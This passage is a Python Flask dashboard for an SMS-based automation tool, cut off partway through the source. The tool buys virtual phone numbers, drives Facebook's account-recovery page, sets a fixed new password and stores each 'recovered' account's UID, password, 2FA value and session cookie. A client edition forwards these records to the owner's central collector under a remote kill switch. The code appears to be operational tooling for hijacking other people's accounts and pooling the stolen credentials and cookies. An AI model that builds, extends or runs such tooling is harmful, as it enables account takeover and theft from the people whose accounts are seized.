import os
import sys
import json
import re
import queue
import subprocess
import threading
import time
import secrets
from functools import wraps
from flask import Flask, Response, jsonify, request, render_template_string, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)

# Global state to keep track of process and logs
log_queue = queue.Queue(maxsize=5000)
process = None
thread = None
is_running = False
session_start_time = None
session_stop_requested_time = None
# Chrome processes launched by THIS instance (so "Kill Chrome" only affects
# this instance, not other isolated instances running on the same machine)
launched_chrome_pids = []

# Location of config and output files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
ACCOUNTS_PATH = os.path.join(BASE_DIR, "recovered_accounts.txt")

# Default config dict
DEFAULT_CONFIG = {
    "chrome_debug_url": "http://127.0.0.1:9222",
    "chrome_profile_name": "Profile 1",
    "multiple_accounts": True,
    "service_text": "Facebook",
    "country_text": "Brazil",
    "buy_text": "Buy for $0.099",
    "min_price": 0.01,
    "max_price": 0.15,
    "target_url": "https://www.facebook.com/login/identify/?ci=AdDhNqxj3bubeKaJl2BAeZF5R84lr1pqkL5Cf2GECCYUaKqqwnbEqH8-EmPr5ktGAoEAQ36l_A8pTW5y1b-Bnht-2xbUC9edHV1cW7O-udVnmbHAM1ZPy-PZmgDLgOHviiToDLhpwlAxn0WywiZA6Y8Wyn-_n9oildrH-L31Wc8bBkOgGVO7udBoB-1zGQIygpu91hfBLtBXTilJ4JnkELUeSBYYFPVtNmnr6RLDvSZ2acPoDdiDrnAOgQOAsKE15PE6ztB0mkwvJZO-LZYfUJXpRt1u",
    "new_password": "HeroSmsRecover123!",
    "confirm_before_buy": False,
    "auto_login": False,
    "hero_username": "",
    "hero_password": "",
    "vpn_connection_name": "",
    "use_api": False,
    "api_provider": "sms-activate",
    "api_base_url": "",
    "api_key": "",
    "api_service_code": "",
    "api_country_code": "0"
}

def load_config_data():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
            # Merge defaults for any missing keys
            config = DEFAULT_CONFIG.copy()
            config.update(data)
            return config
        except Exception:
            return DEFAULT_CONFIG
    return DEFAULT_CONFIG

def save_config_data(data):
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
        return True
    except Exception:
        return False


# ==========================================================================
#  AUTHENTICATION / USER ACCOUNTS
# ==========================================================================
USERS_PATH = os.path.join(BASE_DIR, "users.json")
SECRET_PATH = os.path.join(BASE_DIR, "secret.key")
SERVICE_PATH = os.path.join(BASE_DIR, "service.json")

# The default OWNER account, created on first run. This is YOU — the account
# nobody else can disable, delete, or lock out. Change its password immediately.
DEFAULT_OWNER_USERNAME = "admin"
DEFAULT_OWNER_PASSWORD = "admin"

# Role hierarchy: owner > admin > user
#   owner : you. Untouchable. Only role that controls the global kill switch.
#   admin : can manage (create/disable/delete) users and admins, but never the owner.
#   user  : can operate the dashboard only.
DEFAULT_SERVICE_MESSAGE = "This service is temporarily suspended by the administrator."

# ==========================================================================
#  CLIENT EDITION vs COLLECTOR (central) mode
# ==========================================================================
# When these env vars are set, this copy runs as a CLIENT edition on the
# client's own PC: it uses the client's own Chrome/IP, has NO owner/admin
# panel, uploads recovered accounts to the owner's collector, and obeys a
# remote disable switch. Without them, this copy runs normally (your central
# server + collector).
CLIENT_ID = os.environ.get("HERO_CLIENT_ID", "").strip()
CLIENT_KEY = os.environ.get("HERO_CLIENT_KEY", "").strip()
COLLECTOR_URL = os.environ.get("HERO_COLLECTOR_URL", "").strip()
IS_CLIENT = bool(CLIENT_ID and CLIENT_KEY and COLLECTOR_URL)
# Login for the client's own local app (a plain user, never an admin/owner)
CLIENT_LOGIN_USER = os.environ.get("HERO_CLIENT_LOGIN_USER", "client").strip() or "client"
CLIENT_LOGIN_PASS = os.environ.get("HERO_CLIENT_LOGIN_PASS", "client").strip() or "client"

# Central collector storage (owner side)
COLLECTOR_DIR = os.path.join(BASE_DIR, "Client_Recoveries")
CLIENT_KEYS_PATH = os.path.join(BASE_DIR, "client_keys.json")

# Live remote-disable state for CLIENT edition (updated by the check-in thread).
#   disabled : the owner turned this client off (or we can't verify -> fail closed)
#   verified : we have had at least one recent successful check-in
# FAIL-CLOSED: if the client cannot reach the owner's server for longer than the
# grace period (e.g. they firewall it), the app locks itself instead of running.
client_status = {"disabled": False, "verified": False,
                 "message": "Connecting to verify access…"}
try:
    CLIENT_GRACE_SECONDS = int(os.environ.get("HERO_GRACE_SECONDS", "300") or "300")
except ValueError:
    CLIENT_GRACE_SECONDS = 300


def _load_or_create_secret():
    """Persist a Flask secret key so login sessions survive server restarts."""
    try:
        if os.path.exists(SECRET_PATH):
            with open(SECRET_PATH, "r", encoding="utf-8") as f:
                key = f.read().strip()
            if key:
                return key
        key = secrets.token_hex(32)
        with open(SECRET_PATH, "w", encoding="utf-8") as f:
            f.write(key)
        return key
    except Exception:
        # Fall back to an in-memory key (sessions reset on restart)
        return secrets.token_hex(32)


app.secret_key = _load_or_create_secret()

# Session cookie hardening (matters once this is exposed to a network).
# SESSION_COOKIE_SECURE is enabled automatically when served over HTTPS
# (set HERO_HTTPS=1, e.g. when behind an HTTPS reverse proxy).
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=(os.environ.get("HERO_HTTPS", "").lower() in ("1", "true", "yes")),
    PERMANENT_SESSION_LIFETIME=60 * 60 * 12,  # 12 hours
)
# Honor X-Forwarded-Proto/Host when running behind a reverse proxy (nginx/Caddy).
try:
    from werkzeug.middleware.proxy_fix import ProxyFix
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
except Exception:
    pass


def load_users():
    if os.path.exists(USERS_PATH):
        try:
            with open(USERS_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict) and isinstance(data.get("users"), list):
                return data["users"]
        except Exception:
            pass
    return []


def save_users(users):
    try:
        with open(USERS_PATH, "w", encoding="utf-8") as f:
            json.dump({"users": users}, f, indent=4)
        return True
    except Exception:
        return False


def find_user(username):
    if not username:
        return None
    for u in load_users():
        if u.get("username", "").lower() == username.lower():
            return u
    return None


def is_owner(user):
    return bool(user) and user.get("role") == "owner"


def is_admin(user):
    # Owner has all admin powers too
    return bool(user) and user.get("role") in ("owner", "admin")


def user_active(user):
    """A user may sign in / act only while their account is enabled."""
    return bool(user) and user.get("enabled", True)


# ---- Global service kill switch ----
def load_service():
    state = {"locked": False, "message": DEFAULT_SERVICE_MESSAGE, "updated_at": 0}
    if os.path.exists(SERVICE_PATH):
        try:
            with open(SERVICE_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                state.update({k: data[k] for k in ("locked", "message", "updated_at") if k in data})
        except Exception:
            pass
    return state


def save_service(state):
    try:
        with open(SERVICE_PATH, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=4)
        return True
    except Exception:
        return False


def service_locked():
    return bool(load_service().get("locked", False))


def ensure_default_owner():
    """Seed the first-run account.

    - Client edition: seed ONLY a plain 'user' account (no owner/admin exists
      locally, so the client can never reach admin features).
    - Central/collector: seed the owner account and guarantee one always exists.
    """
    users = load_users()
    if IS_CLIENT:
        if not users:
            users.append({
                "username": CLIENT_LOGIN_USER,
                "password_hash": generate_password_hash(CLIENT_LOGIN_PASS),
                "role": "user",
                "enabled": True,
                "created_at": int(time.time()),
            })
            save_users(users)
        # Never allow an owner/admin to exist in the client edition
        changed = False
        for u in users:
            if u.get("role") in ("owner", "admin"):
                u["role"] = "user"
                changed = True
        if changed:
            save_users(users)
        return
    if not users:
        users.append({
            "username": DEFAULT_OWNER_USERNAME,
            "password_hash": generate_password_hash(DEFAULT_OWNER_PASSWORD),
            "role": "owner",
            "enabled": True,
            "created_at": int(time.time()),
        })
        save_users(users)
        return
    # Safety net: if somehow no owner exists, promote the first account to owner
    if not any(u.get("role") == "owner" for u in users):
        users[0]["role"] = "owner"
        users[0]["enabled"] = True
        save_users(users)


def current_user():
    return find_user(session.get("username"))


# Endpoints reachable without being logged in.
# api_collect is machine-to-machine (client -> collector), authed by client key.
PUBLIC_ENDPOINTS = {"login", "logout", "static", "api_collect"}


@app.before_request
def require_login():
    if request.endpoint in PUBLIC_ENDPOINTS:
        return None
    # Client edition: honor the owner's remote disable switch (fail-closed:
    # blocked while disabled OR until a successful check-in has verified access)
    if IS_CLIENT and (client_status.get("disabled") or not client_status.get("verified")):
        if request.path.startswith("/api/") or request.path == "/stream":
            return jsonify({"status": "error", "message": client_status.get("message", "Access disabled.")}), 503
        return render_template_string(CLIENT_DISABLED_TEMPLATE, message=client_status.get("message", "Access disabled."))
    user = current_user()
    # Not logged in, disabled, or expired -> out
    if not user_active(user):
        session.clear()
        if request.path.startswith("/api/") or request.path == "/stream":
            return jsonify({"status": "error", "message": "Authentication required."}), 401
        return redirect(url_for("login", next=request.path))
    # Global kill switch: everyone except the owner is locked out while suspended
    if service_locked() and not is_owner(user):
        session.clear()
        if request.path.startswith("/api/") or request.path == "/stream":
            return jsonify({"status": "error", "message": "Service suspended."}), 503
        return redirect(url_for("login", suspended=1))
    return None


def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        user = current_user()
        if not user_active(user):
            session.clear()
            return jsonify({"status": "error", "message": "Authentication required."}), 401
        if not is_admin(user):
            return jsonify({"status": "error", "message": "Admin privileges required."}), 403
        return f(*args, **kwargs)
    return wrapper


def owner_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        user = current_user()
        if not user_active(user):
            session.clear()
            return jsonify({"status": "error", "message": "Authentication required."}), 401
        if not is_owner(user):
            return jsonify({"status": "error", "message": "Owner privileges required."}), 403
        return f(*args, **kwargs)
    return wrapper


# Create the default owner on startup
ensure_default_owner()

def parse_recovered_accounts():
    accounts = []
    if os.path.exists(ACCOUNTS_PATH):
        try:
            with open(ACCOUNTS_PATH, "r", encoding="utf-8") as f:
                content = f.read()
            
            # Accounts are separated by "--- Recovered Account [...] ---" header
            # Table row is like: UID | Password | 2FA | Cookie
            entries = content.split("--- Recovered Account")
            for entry in entries:
                if not entry.strip():
                    continue
                lines = [l.strip() for l in entry.strip().split("\n") if l.strip()]
                if not lines:
                    continue
                
                # First line is header remnant like: " [2026-07-14 12:43:00 | Profile 1 ] ---"
                header_line = lines[0]
                date_time = "Unknown"
                profile_name = "Unknown"
                
                # Extract date/time and profile
                meta_match = re.search(r'\[(.*?)\]', header_line) if 're' in sys.modules else None
                # We can also just parse manually
                if "[" in header_line and "]" in header_line:
                    meta_content = header_line.split("[")[1].split("]")[0]
                    if "|" in meta_content:
                        date_time, profile_name = [x.strip() for x in meta_content.split("|")]
                    else:
                        date_time = meta_content.strip()
                
                # The next line contains the actual account pipe-separated details
                for line in lines[1:]:
                    if "|" in line:
                        parts = [p.strip() for p in line.split("|")]
                        if len(parts) >= 4:
                            uid = parts[0]
                            password = parts[1]
                            two_fa = parts[2]
                            cookie = "|".join(parts[3:]) # handle cases where cookie itself has pipes
                            accounts.append({
                                "uid": uid,
                                "password": password,
                                "two_fa": two_fa if two_fa else "None",
                                "cookie": cookie,
                                "date": date_time,
                                "profile": profile_name
                            })
                            break
        except Exception as e:
            print(f"Error parsing accounts file: {e}")
    # Return reversed list so the newest entries are at the top
    return accounts[::-1]


def recalculate_recovered_counts():
    try:
        accounts = parse_recovered_accounts()
        counts = {}
        for acc in accounts:
            if "date" in acc and acc["date"] != "Unknown":
                date_part = acc["date"].split(" ")[0]
                counts[date_part] = counts.get(date_part, 0) + 1
                
        stats_path = os.path.join(BASE_DIR, "recovered_stats.json")
        data = {}
        if os.path.exists(stats_path):
            with open(stats_path, "r", encoding="utf-8") as f:
                try:
                    raw_data = json.load(f)
                    for k, v in raw_data.items():
                        if isinstance(v, dict):
                            data[k] = v
                        else:
                            data[k] = {
                                "recovered": int(v),
                                "spent": 0.0,
                                "duration": 0,
                                "failed_logins": 0,
                                "success_duration": 0
                            }
                except:
                    pass
                    
        updated = False
        for date, count in counts.items():
            entry = data.setdefault(date, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0})
            if not isinstance(entry, dict):
                entry = {"recovered": int(entry), "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0}
                data[date] = entry
            entry.setdefault("failed_logins", 0)
            entry.setdefault("success_duration", 0)
            if entry["recovered"] != count:
                entry["recovered"] = count
                updated = True
                
        if updated:
            with open(stats_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Could not synchronize stats: {e}")


def update_duration_in_stats(start_time: float, end_time: float, is_success: bool = False) -> None:
    try:
        from datetime import datetime, timedelta
        import json
        
        stats_path = os.path.join(BASE_DIR, "recovered_stats.json")
        
        data = {}
        if os.path.exists(stats_path):
            with open(stats_path, "r", encoding="utf-8") as f:
                try:
                    raw_data = json.load(f)
                    for k, v in raw_data.items():
                        if isinstance(v, dict):
                            data[k] = v
                        else:
                            data[k] = {
                                "recovered": int(v),
                                "spent": 0.0,
                                "duration": 0,
                                "failed_logins": 0,
                                "success_duration": 0
                            }
                except:
                    pass
                    
        # Split elapsed duration day-by-day to prevent midnight timezone bleed
        current_time = start_time
        while current_time < end_time:
            dt = datetime.fromtimestamp(current_time)
            current_date_str = dt.strftime("%Y-%m-%d")
            
            # Find start of next day in local time
            next_day_dt = datetime(dt.year, dt.month, dt.day) + timedelta(days=1)
            next_day_timestamp = next_day_dt.timestamp()
            
            chunk_end = min(next_day_timestamp, end_time)
            chunk_seconds = int(chunk_end - current_time)
            
            entry = data.setdefault(current_date_str, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0})
            if not isinstance(entry, dict):
                entry = {"recovered": int(entry), "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0}
                data[current_date_str] = entry
                
            entry.setdefault("failed_logins", 0)
            entry.setdefault("success_duration", 0)
            
            entry["duration"] = entry.get("duration", 0) + chunk_seconds
            if is_success:
                entry["success_duration"] = entry.get("success_duration", 0) + chunk_seconds
                
            current_time = chunk_end
            
        with open(stats_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Could not record duration from app.py: {e}")


session_recovered_baseline = 0

def run_automation_process():
    global process, is_running, session_start_time, session_recovered_baseline
    is_running = True
    session_start_time = time.time()
    log_queue.put("[SYSTEM] Spawning browser automation process...\n")
    
    python_exec = os.path.join(BASE_DIR, ".venv", "Scripts", "python.exe")
    if not os.path.exists(python_exec):
        python_exec = "python"
        
    start_accounts_count = 0
    try:
        start_accounts_count = len(parse_recovered_accounts())
        session_recovered_baseline = start_accounts_count
    except:
        pass
        
    try:
        # Enforce UTF-8 encoding in Python subprocess on Windows
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        env["HERO_UI_RUN"] = "1"
        
        # Run with unbuffered output (-u) to capture stdout instantly
        process = subprocess.Popen(
            [python_exec, "-u", "hero_sms_automation.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            bufsize=1,
            cwd=BASE_DIR,
            env=env
        )
        
        # Read stdout line by line (also mirror to automation.log for debugging)
        try:
            _autolog = open(os.path.join(BASE_DIR, "automation.log"), "w", encoding="utf-8")
        except Exception:
            _autolog = None
        for line in iter(process.stdout.readline, ''):
            log_queue.put(line)
            if _autolog is not None:
                try:
                    _autolog.write(line); _autolog.flush()
                except Exception:
                    pass
        if _autolog is not None:
            try:
                _autolog.close()
            except Exception:
                pass

        process.stdout.close()
        process.wait()
        
        # Send finish signal to queue
        rc = process.returncode
        log_queue.put(f"[SYSTEM_FINISH] Automation session terminated. Exit code: {rc}\n")
    except Exception as e:
        log_queue.put(f"[SYSTEM_FINISH] Failed to start subprocess: {e}\n")
    finally:
        global session_stop_requested_time
        if session_start_time:
            end_time = session_stop_requested_time if session_stop_requested_time else time.time()
            end_accounts_count = 0
            try:
                end_accounts_count = len(parse_recovered_accounts())
            except:
                pass
            is_success = (end_accounts_count > start_accounts_count)
            update_duration_in_stats(session_start_time, end_time, is_success)
            session_start_time = None
        session_stop_requested_time = None
        is_running = False
        process = None


@app.route('/login', methods=['GET', 'POST'])
def login():
    ensure_default_owner()
    svc = load_service()
    error = None
    # Banner shown when a suspended non-owner is bounced back here
    notice = svc.get("message") if (svc.get("locked") and request.args.get("suspended")) else None
    if request.method == 'POST':
        username = (request.form.get('username') or '').strip()
        password = request.form.get('password') or ''
        user = find_user(username)
        if not user or not check_password_hash(user.get('password_hash', ''), password):
            error = "Invalid username or password."
        elif not user.get('enabled', True):
            error = "This account has been disabled. Contact an administrator."
        elif svc.get("locked") and not is_owner(user):
            # Service suspended: only the owner may sign in
            notice = svc.get("message") or DEFAULT_SERVICE_MESSAGE
        else:
            session.clear()
            session.permanent = True
            session['username'] = user['username']
            nxt = request.args.get('next') or url_for('index')
            # Only allow internal redirects
            if not nxt.startswith('/'):
                nxt = url_for('index')
            return redirect(nxt)
    return render_template_string(LOGIN_TEMPLATE, error=error, notice=notice)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/api/me', methods=['GET'])
def api_me():
    user = current_user()
    svc = load_service()
    return jsonify({
        "username": user["username"],
        "role": user.get("role", "user"),
        "is_admin": is_admin(user),
        "is_owner": is_owner(user),
        "service_locked": bool(svc.get("locked")),
        "service_message": svc.get("message", DEFAULT_SERVICE_MESSAGE),
    })


@app.route('/api/service', methods=['GET'])
def api_service_status():
    svc = load_service()
    return jsonify({
        "locked": bool(svc.get("locked")),
        "message": svc.get("message", DEFAULT_SERVICE_MESSAGE),
        "updated_at": svc.get("updated_at", 0),
    })


@app.route('/api/service', methods=['POST'])
@owner_required
def api_service_set():
    """Owner-only global kill switch. Body: {"locked": bool, "message": str?}"""
    data = request.json or {}
    svc = load_service()
    if "locked" in data:
        svc["locked"] = bool(data["locked"])
    if data.get("message"):
        svc["message"] = str(data["message"])[:300]
    svc["updated_at"] = int(time.time())
    save_service(svc)
    state = "suspended" if svc["locked"] else "active"
    return jsonify({"status": "success", "message": f"Service is now {state}.", "locked": svc["locked"]})


@app.route('/api/change_password', methods=['POST'])
def api_change_password():
    """Any logged-in user can change their own password."""
    user = current_user()
    data = request.json or {}
    current_pw = data.get('current_password') or ''
    new_pw = data.get('new_password') or ''
    if not check_password_hash(user.get('password_hash', ''), current_pw):
        return jsonify({"status": "error", "message": "Current password is incorrect."}), 400
    if len(new_pw) < 4:
        return jsonify({"status": "error", "message": "New password must be at least 4 characters."}), 400
    users = load_users()
    for u in users:
        if u['username'].lower() == user['username'].lower():
            u['password_hash'] = generate_password_hash(new_pw)
            break
    save_users(users)
    return jsonify({"status": "success", "message": "Password updated."})


@app.route('/api/users', methods=['GET'])
@admin_required
def api_users_list():
    users = load_users()
    return jsonify([
        {
            "username": u["username"],
            "role": u.get("role", "user"),
            "enabled": u.get("enabled", True),
            "created_at": u.get("created_at", 0),
        }
        for u in users
    ])


@app.route('/api/users', methods=['POST'])
@admin_required
def api_users_create():
    data = request.json or {}
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''
    role = data.get('role') or 'user'
    if role not in ('user', 'admin'):
        role = 'user'
    if not username or not password:
        return jsonify({"status": "error", "message": "Username and password are required."}), 400
    if len(password) < 4:
        return jsonify({"status": "error", "message": "Password must be at least 4 characters."}), 400
    if find_user(username):
        return jsonify({"status": "error", "message": "That username already exists."}), 400
    users = load_users()
    users.append({
        "username": username,
        "password_hash": generate_password_hash(password),
        "role": role,
        "enabled": True,
        "created_at": int(time.time()),
    })
    save_users(users)
    return jsonify({"status": "success", "message": f"User '{username}' created."})


@app.route('/api/users/<username>/toggle', methods=['POST'])
@admin_required
def api_users_toggle(username):
    me = current_user()
    if username.lower() == me['username'].lower():
        return jsonify({"status": "error", "message": "You cannot disable your own account."}), 400
    users = load_users()
    target = None
    for u in users:
        if u['username'].lower() == username.lower():
            target = u
            break
    if not target:
        return jsonify({"status": "error", "message": "User not found."}), 404
    # The owner account is untouchable
    if target.get('role') == 'owner':
        return jsonify({"status": "error", "message": "The owner account cannot be disabled."}), 400
    target['enabled'] = not target.get('enabled', True)
    save_users(users)
    state = "enabled" if target['enabled'] else "disabled"
    return jsonify({"status": "success", "message": f"User '{username}' {state}.", "enabled": target['enabled']})


@app.route('/api/users/<username>', methods=['DELETE'])
@admin_required
def api_users_delete(username):
    me = current_user()
    if username.lower() == me['username'].lower():
        return jsonify({"status": "error", "message": "You cannot delete your own account."}), 400
    users = load_users()
    target = next((u for u in users if u['username'].lower() == username.lower()), None)
    if not target:
        return jsonify({"status": "error", "message": "User not found."}), 404
    # The owner account is untouchable
    if target.get('role') == 'owner':
        return jsonify({"status": "error", "message": "The owner account cannot be deleted."}), 400
    users = [u for u in users if u['username'].lower() != username.lower()]
    save_users(users)
    return jsonify({"status": "success", "message": f"User '{username}' deleted."})


# ==========================================================================
#  INSTANCE MANAGER (owner-only, main server only)
#  Lets the owner create/start/stop/delete isolated instances (each on its
#  own port with its own data) directly from the dashboard.
# ==========================================================================
INSTANCES_DIR = os.path.join(BASE_DIR, "instances")
INSTANCES_REGISTRY = os.path.join(BASE_DIR, "instances.json")
INSTANCE_CODE_FILES = ["app.py", "hero_sms_automation.py", "clean_unused_profiles.py",
                       "analyze_recovery_times.py", "requirements.txt"]
# The main server is the "manager". Child instances are spawned with HERO_CHILD=1
# so they are plain worker dashboards and cannot spawn further instances.
IS_MANAGER = os.environ.get("HERO_CHILD") != "1"
try:
    SELF_PORT = int(os.environ.get("HERO_PORT", "5000") or "5000")
except ValueError:
    SELF_PORT = 5000


def load_instances():
    if os.path.exists(INSTANCES_REGISTRY):
        try:
            with open(INSTANCES_REGISTRY, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                return data
        except Exception:
            pass
    return []


def save_instances(items):
    try:
        with open(INSTANCES_REGISTRY, "w", encoding="utf-8") as f:
            json.dump(items, f, indent=4)
        return True
    except Exception:
        return False


def _valid_instance_name(name):
    return bool(re.match(r'^[A-Za-z0-9_-]{1,30}$', name or ''))


def _port_alive(port):
    import socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.4)
            s.connect(("127.0.0.1", int(port)))
            return True
    except Exception:
        return False


def _find_free_port(start=5001):
    used = {int(i.get("port")) for i in load_instances() if i.get("port")}
    used.add(SELF_PORT)
    p = start
    while p < 65535:
        if p not in used and not _port_alive(p):
            return p
        p += 1
    return None


def _pid_on_port(port):
    """Return the PID listening on the given TCP port (Windows/Unix netstat)."""
    try:
        out = subprocess.check_output("netstat -ano -p tcp", shell=True, text=True)
    except Exception:
        try:
            out = subprocess.check_output("netstat -ano", shell=True, text=True)
        except Exception:
            return None
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 5 and parts[0].upper().startswith("TCP") and parts[3].upper() == "LISTENING":
            if parts[1].endswith(f":{port}"):
                try:
                    return int(parts[4])
                except Exception:
                    pass
    return None


def _kill_pid(pid):
    try:
        if sys.platform == 'win32':
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(pid)], capture_output=True)
        else:
            subprocess.run(["kill", "-9", str(pid)], capture_output=True)
        return True
    except Exception:
        return False


def _copy_code_to(dest):
    import shutil
    os.makedirs(dest, exist_ok=True)
    for f in INSTANCE_CODE_FILES:
        src = os.path.join(BASE_DIR, f)
        if os.path.exists(src):
            shutil.copy2(src, os.path.join(dest, os.path.basename(f)))


def _spawn_instance(name, port):
    dest = os.path.join(INSTANCES_DIR, name)
    env = os.environ.copy()
    env["HERO_CHILD"] = "1"           # mark as a worker (no instance manager)
    env["HERO_PORT"] = str(port)
    env.setdefault("HERO_HOST", os.environ.get("HERO_HOST", "127.0.0.1"))
    flags = 0
    if sys.platform == 'win32':
        flags = subprocess.CREATE_NEW_CONSOLE
    subprocess.Popen([sys.executable, "app.py", str(port)], cwd=dest, env=env, creationflags=flags)


def manager_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not IS_MANAGER:
            return jsonify({"status": "error", "message": "Instance management is only available on the main server."}), 403
        return f(*args, **kwargs)
    return wrapper


@app.route('/api/instances', methods=['GET'])
@owner_required
@manager_required
def api_instances_list():
    result = []
    for it in load_instances():
        port = it.get("port")
        result.append({
            "name": it.get("name"),
            "port": port,
            "created_at": it.get("created_at", 0),
            "running": _port_alive(port) if port else False,
        })
    return jsonify(result)


@app.route('/api/instances', methods=['POST'])
@owner_required
@manager_required
def api_instances_create():
    data = request.json or {}
    name = (data.get("name") or "").strip()
    if not _valid_instance_name(name):
        return jsonify({"status": "error", "message": "Name must be 1-30 chars: letters, numbers, - or _ only."}), 400
    items = load_instances()
    if any(i.get("name", "").lower() == name.lower() for i in items):
        return jsonify({"status": "error", "message": "An instance with that name already exists."}), 400
    port = data.get("port")
    if port:
        try:
            port = int(port)
        except Exception:
            return jsonify({"status": "error", "message": "Port must be a number."}), 400
        if port == SELF_PORT or any(int(i.get("port", 0)) == port for i in items) or _port_alive(port):
            return jsonify({"status": "error", "message": "That port is already in use."}), 400
    else:
        port = _find_free_port()
        if not port:
            return jsonify({"status": "error", "message": "No free port available."}), 500
    dest = os.path.join(INSTANCES_DIR, name)
    try:
        _copy_code_to(dest)
        items.append({"name": name, "port": port, "created_at": int(time.time())})
        save_instances(items)
        _spawn_instance(name, port)
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to create instance: {e}"}), 500
    return jsonify({"status": "success", "message": f"Instance '{name}' created on port {port}.", "name": name, "port": port})


@app.route('/api/instances/<name>/start', methods=['POST'])
@owner_required
@manager_required
def api_instances_start(name):
    it = next((i for i in load_instances() if i.get("name", "").lower() == name.lower()), None)
    if not it:
        return jsonify({"status": "error", "message": "Instance not found."}), 404
    port = it.get("port")
    if _port_alive(port):
        return jsonify({"status": "success", "message": "Instance is already running."})
    dest = os.path.join(INSTANCES_DIR, it["name"])
    if not os.path.exists(os.path.join(dest, "app.py")):
        _copy_code_to(dest)
    _spawn_instance(it["name"], port)
    return jsonify({"status": "success", "message": f"Instance '{it['name']}' starting on port {port}."})


@app.route('/api/instances/<name>/stop', methods=['POST'])
@owner_required
@manager_required
def api_instances_stop(name):
    it = next((i for i in load_instances() if i.get("name", "").lower() == name.lower()), None)
    if not it:
        return jsonify({"status": "error", "message": "Instance not found."}), 404
    pid = _pid_on_port(it.get("port"))
    if not pid:
        return jsonify({"status": "success", "message": "Instance was not running."})
    if not _kill_pid(pid):
        return jsonify({"status": "error", "message": "Failed to stop instance."}), 500
    return jsonify({"status": "success", "message": f"Instance '{it['name']}' stopped."})


@app.route('/api/instances/<name>', methods=['DELETE'])
@owner_required
@manager_required
def api_instances_delete(name):
    import shutil
    items = load_instances()
    it = next((i for i in items if i.get("name", "").lower() == name.lower()), None)
    if not it:
        return jsonify({"status": "error", "message": "Instance not found."}), 404
    pid = _pid_on_port(it.get("port"))
    if pid:
        _kill_pid(pid)
    dest = os.path.join(INSTANCES_DIR, it["name"])
    try:
        if os.path.exists(dest):
            shutil.rmtree(dest, ignore_errors=True)
    except Exception:
        pass
    items = [i for i in items if i.get("name", "").lower() != name.lower()]
    save_instances(items)
    return jsonify({"status": "success", "message": f"Instance '{it['name']}' deleted."})


# ==========================================================================
#  CLIENT COLLECTOR (owner side) + CLIENT UPLOADER (client side)
# ==========================================================================
CLIENT_DISABLED_TEMPLATE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access disabled</title>
<style>body{background:#0b0f19;color:#f3f4f6;font-family:sans-serif;display:flex;
align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}
.box{max-width:420px;padding:2rem;border:1px solid rgba(239,68,68,.4);border-radius:16px;
background:rgba(239,68,68,.08)}h1{color:#fca5a5;font-size:1.3rem}p{color:#9ca3af}</style></head>
<body><div class="box"><h1>Access disabled</h1><p>{{ message }}</p></div></body></html>
"""


# Guards every read-modify-write of client_keys.json so concurrent client
# check-ins can't corrupt or wipe the list. RLock = safe to nest (mutators call
# save while holding it).
_client_keys_lock = threading.RLock()


def load_client_keys():
    with _client_keys_lock:
        for path in (CLIENT_KEYS_PATH, CLIENT_KEYS_PATH + ".bak"):
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        d = json.load(f)
                    if isinstance(d, list):
                        return d
                except Exception:
                    # Corrupted primary -> fall through to the .bak backup
                    continue
        return []


def save_client_keys(items):
    # Only save a real list, and never blow away existing data with an empty
    # list unless the file was already empty (guards against a transient bad read).
    if not isinstance(items, list):
        return False
    with _client_keys_lock:
        try:
            if not items and os.path.exists(CLIENT_KEYS_PATH):
                # Refuse to overwrite existing clients with nothing
                try:
                    with open(CLIENT_KEYS_PATH, "r", encoding="utf-8") as f:
                        existing = json.load(f)
                    if isinstance(existing, list) and existing:
                        return False
                except Exception:
                    pass
            # Keep a backup of the last good file
            if os.path.exists(CLIENT_KEYS_PATH):
                try:
                    import shutil
                    shutil.copy2(CLIENT_KEYS_PATH, CLIENT_KEYS_PATH + ".bak")
                except Exception:
                    pass
            # Atomic write: write to a temp file, fsync, then replace
            tmp = CLIENT_KEYS_PATH + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(items, f, indent=4)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp, CLIENT_KEYS_PATH)
            return True
        except Exception:
            return False


def find_client_key(cid):
    for c in load_client_keys():
        if c.get("client_id", "").lower() == (cid or "").lower():
            return c
    return None


def _safe_client_folder(cid):
    return re.sub(r'[^A-Za-z0-9_-]', '_', cid) or "client"


def _account_blocks(text):
